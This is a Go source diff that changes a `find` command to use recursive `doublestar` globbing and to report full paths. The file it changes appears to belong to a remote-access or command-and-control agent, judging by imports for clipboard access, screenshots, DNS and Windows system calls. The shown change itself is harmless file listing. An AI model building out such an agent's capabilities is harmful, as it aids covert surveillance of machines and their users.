@@ -21,7 +21,6 @@ import (
 	"os"
 	"os/exec"
 	"os/user"
-	"path/filepath"
 	"runtime"
 	"strconv"
 	"strings"
@@ -30,6 +29,7 @@ import (
 	"unsafe"
 
 	"github.com/atotto/clipboard"
+	"github.com/bmatcuk/doublestar"
 	"github.com/kbinani/screenshot"
 	"github.com/miekg/dns"
 	"golang.org/x/sys/windows"
@@ -1094,26 +1094,30 @@ func ls(location string) string { // Lists the files in the given directory
 }
 
 func find(glob string) string { // Searches the current directory for the glob
-	filenames, err := filepath.Glob(glob)
+	filenames, err := doublestar.Glob(glob)
 	if err != nil {
 		return "Invalid glob pattern."
 	}
 	var result string
-	for _, filename := range filenames {
-		f, err := os.Stat(filename)
-		if err != nil {
-			// If we can't stat the file for some reason, don't prevent other results from being returned
-			result = result + spacePad("n/a", "ts") + "   <ERR>    " + spacePad("n/a", "size") + "     " + filename + "\n"
-			continue
+	if len(filenames) > 0 {
+		for _, filename := range filenames {
+			f, err := os.Stat(filename)
+			if err != nil {
+				// If we can't stat the file for some reason, don't prevent other results from being returned
+				result = result + spacePad("n/a", "ts") + "   <ERR>    " + spacePad("n/a", "size") + "     " + filename + "\n"
+				continue
+			}
+			size := ByteCountDecimal(f.Size())
+			timestamp := f.ModTime()
+			ts := timestamp.Format("01/02/2006 3:04:05 PM MST")
+			dir := "            "
+			if f.IsDir() {
+				dir = "   <DIR>    "
+			}
+			result = result + spacePad(ts, "ts") + dir + spacePad(size, "size") + "     " + filename + "\n"
 		}
-		size := ByteCountDecimal(f.Size())
-		timestamp := f.ModTime()
-		ts := timestamp.Format("01/02/2006 3:04:05 PM MST")
-		dir := "            "
-		if f.IsDir() {
-			dir = "   <DIR>    "
-		}
-		result = result + spacePad(ts, "ts") + dir + spacePad(size, "size") + "     " + f.Name() + "\n"
+	} else {
+		return "No matches."
 	}
 	return result
 }
